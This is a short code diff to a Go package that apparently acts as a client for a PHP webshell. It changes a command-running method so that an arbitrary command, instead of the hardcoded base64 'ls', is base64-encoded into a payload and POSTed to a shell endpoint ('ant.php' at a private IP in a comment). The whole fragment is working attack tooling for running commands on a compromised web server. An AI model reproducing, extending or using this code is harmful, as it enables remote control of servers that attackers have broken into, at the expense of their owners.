@@ -3,6 +3,7 @@ package entity
 import (
 	"bytes"
 	"compress/gzip"
+	"encoding/base64"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -30,9 +31,9 @@ type PHPEntity struct {
 	Command string
 }
 
-func (e *PHPEntity) RunCmdWithOutput() (string, error) {
+func (e *PHPEntity) RunCmdWithOutput(cmd string) (string, error) {
 	client := http.Client{Timeout: time.Second * 30}
-	payload := strings.ReplaceAll(UrlPayload, Core, "bHM=")
+	payload := strings.ReplaceAll(UrlPayload, Core, base64.RawStdEncoding.EncodeToString([]byte(cmd)))
 	body := bytes.NewBuffer([]byte(payload))
 	req, err := http.NewRequest(Method, e.Target, body) // "http://172.31.50.248:8080/ant.php"
 	if err != nil {
